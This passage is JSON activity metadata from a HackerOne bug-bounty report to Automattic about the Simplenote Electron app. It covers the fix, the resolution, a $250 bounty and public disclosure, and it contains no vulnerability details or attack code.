regards","automated_response":false,"created_at":"2018-06-18T11:45:32.368Z","updated_at":"2018-06-18T11:45:32.368Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2902840,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Taking a look now, will get back to you soon.","automated_response":false,"created_at":"2018-06-18T20:07:09.963Z","updated_at":"2018-06-18T20:07:09.963Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2908291,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've created a fix here, if you are curious about the details: https://github.com/Automattic/simplenote-electron/pull/771","automated_response":false,"created_at":"2018-06-19T18:05:01.499Z","updated_at":"2018-06-19T18:05:01.499Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2911516,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good, thanks @roundhill :)\n\nWhen you want you can set the report like \"Resolved\"!","automated_response":false,"created_at":"2018-06-20T11:43:57.700Z","updated_at":"2018-06-20T11:44:36.671Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2932597,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-06-25T20:09:41.671Z","updated_at":"2018-06-25T20:09:41.671Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"luigigubello","url":"/luigigubello"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2932599,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-06-25T20:10:27.188Z","updated_at":"2018-06-25T20:10:27.188Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"luigigubello","url":"/luigigubello"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2934312,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you :) Can we do public disclosure?\n","automated_response":false,"created_at":"2018-06-26T08:26:03.270Z","updated_at":"2018-06-26T08:26:03.270Z","first_to_agree":true,"actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3099974,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-07-26T08:26:07.167Z","updated_at":"2018-07-26T08:26:07.167Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}